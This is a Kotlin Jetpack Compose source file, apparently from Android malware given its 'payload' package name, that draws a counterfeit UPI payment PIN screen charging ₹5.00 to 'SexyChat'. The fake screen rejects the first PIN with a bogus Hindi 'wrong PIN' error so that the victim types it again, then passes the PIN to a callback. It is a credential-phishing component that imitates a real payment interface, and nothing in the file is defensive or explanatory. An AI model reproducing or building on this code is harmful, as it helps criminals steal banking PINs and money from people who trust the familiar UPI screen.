package com.payload.jansiix0ne.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Close
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog

@Composable
fun UPIPinScreen(
    amount: String = "₹5.00",
    recipient: String = "SexyChat",
    onPinEntered: (String) -> Unit,
    onCancel: () -> Unit
) {
    var pin by remember { mutableStateOf("") }
    var isProcessing by remember { mutableStateOf(false) }
    var showErrorDialog by remember { mutableStateOf(false) }
    var isFirstAttempt by remember { mutableStateOf(true) }
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
    ) {
        // Header with UPI Logo
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "UPI",
                fontSize = 32.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF097939)
            )
            Text(
                text = "Unified Payments",
                fontSize = 18.sp,
                color = Color(0xFF666666)
            )
        }
        
        Divider(color = Color(0xFFE0E0E0), thickness = 1.dp)
        
        // Transaction Details Box
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0x33808080))
                .padding(horizontal = 16.dp, vertical = 12.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column {
                Text(
                    text = "To:",
                    fontSize = 14.sp,
                    color = Color(0xFF666666)
                )
                Text(
                    text = "Sending:",
                    fontSize = 14.sp,
                    color = Color(0xFF666666)
                )
            }
            Column(horizontalAlignment = Alignment.End) {
                Text(
                    text = recipient,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF666666)
                )
                Text(
                    text = amount,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF666666)
                )
            }
        }
        
        Spacer(modifier = Modifier.height(24.dp))
        
        // Enter PIN Text
        Text(
            text = "ENTER UPI 4 OR 6 DIGIT PIN",
            fontSize = 14.sp,
            color = Color(0xFF333333),
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 24.dp),
            textAlign = TextAlign.Center
        )
        
        Spacer(modifier = Modifier.height(16.dp))
        
        // PIN Input Boxes
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 24.dp),
            horizontalArrangement = Arrangement.Center,
            verticalAlignment = Alignment.CenterVertically
        ) {
            repeat(6) { index ->
                Box(
                    modifier = Modifier
                        .size(40.dp, 48.dp)
                        .border(1.dp, Color(0xFFBBBBBB), RoundedCornerShape(4.dp))
                        .background(Color.White, RoundedCornerShape(4.dp)),
                    contentAlignment = Alignment.Center
                ) {
                    if (index < pin.length) {
                        Text(
                            text = "●",
                            fontSize = 24.sp,
                            color = Color.Black
                        )
                    }
                }
                if (index < 5) {
                    Spacer(modifier = Modifier.width(8.dp))
                }
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        // Warning Box
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 24.dp)
                .clip(RoundedCornerShape(4.dp))
                .background(Color(0xFFFFF3CD))
                .border(4.dp, Color(0xFFFFC107), RoundedCornerShape(4.dp))
                .padding(12.dp)
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "!",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF856404),
                    modifier = Modifier.padding(end = 8.dp)
                )
                Text(
                    text = "You are transferring money from your account to $recipient",
                    fontSize = 12.sp,
                    color = Color(0xFF856404),
                    lineHeight = 16.sp
                )
            }
        }
        
        Spacer(modifier = Modifier.weight(1f))
        
        // Number Pad
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(topStart = 24.dp, topEnd = 24.dp))
                .background(Color(0xFFF5F5F5))
                .padding(horizontal = 48.dp, vertical = 16.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Row 1-3: Numbers
            for (row in 0..2) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceEvenly
                ) {
                    for (col in 1..3) {
                        val number = (row * 3 + col).toString()
                        NumberButton(number) {
                            if (pin.length < 6) pin += number
                        }
                    }
                }
            }
            
            // Row 4: Delete, 0, Submit
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                IconButton(
                    onClick = { if (pin.isNotEmpty()) pin = pin.dropLast(1) },
                    modifier = Modifier.size(64.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Close,
                        contentDescription = "Delete",
                        tint = Color(0xFF333333),
                        modifier = Modifier.size(28.dp)
                    )
                }
                
                NumberButton("0") {
                    if (pin.length < 6) pin += "0"
                }
                
                IconButton(
                    onClick = {
                        if (pin.length == 4 || pin.length == 6) {
                            isProcessing = true
                            // Simulate processing
                            kotlinx.coroutines.GlobalScope.launch {
                                kotlinx.coroutines.delay(3000)
                                if (isFirstAttempt) {
                                    isProcessing = false
                                    showErrorDialog = true
                                    isFirstAttempt = false
                                } else {
                                    onPinEntered(pin)
                                }
                            }
                        }
                    },
                    modifier = Modifier.size(64.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Check,
                        contentDescription = "Submit",
                        tint = Color(0xFF4CAF50),
                        modifier = Modifier.size(28.dp)
                    )
                }
            }
        }
    }
    
    // Processing Dialog
    if (isProcessing) {
        Dialog(onDismissRequest = {}) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(16.dp))
                    .background(Color.White)
                    .padding(32.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(64.dp),
                        color = Color(0xFF4CAF50),
                        strokeWidth = 4.dp
                    )
                    Spacer(modifier = Modifier.height(16.dp))
                    Text(
                        text = "Processing Payment...",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = Color(0xFF333333)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "कृपया प्रतीक्षा करें",
                        fontSize = 14.sp,
                        color = Color(0xFF666666)
                    )
                }
            }
        }
    }
    
    // Error Dialog
    if (showErrorDialog) {
        Dialog(onDismissRequest = {}) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(16.dp))
                    .background(Color.White)
                    .padding(32.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "❌",
                        fontSize = 64.sp
                    )
                    Spacer(modifier = Modifier.height(16.dp))
                    Text(
                        text = "पिन गलत है",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = Color(0xFF333333)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "कृपया सही पिन दर्ज करें",
                        fontSize = 14.sp,
                        color = Color(0xFF666666)
                    )
                    Spacer(modifier = Modifier.height(24.dp))
                    Button(
                        onClick = {
                            showErrorDialog = false
                            pin = ""
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFFEF5350)
                        ),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Text(
                            text = "फिर से प्रयास करें",
                            fontSize = 14.sp,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun NumberButton(
    number: String,
    onClick: () -> Unit
) {
    TextButton(
        onClick = onClick,
        modifier = Modifier.size(64.dp),
        colors = ButtonDefaults.textButtonColors(
            contentColor = Color(0xFF333333)
        )
    ) {
        Text(
            text = number,
            fontSize = 22.sp,
            fontWeight = FontWeight.Medium
        )
    }
}
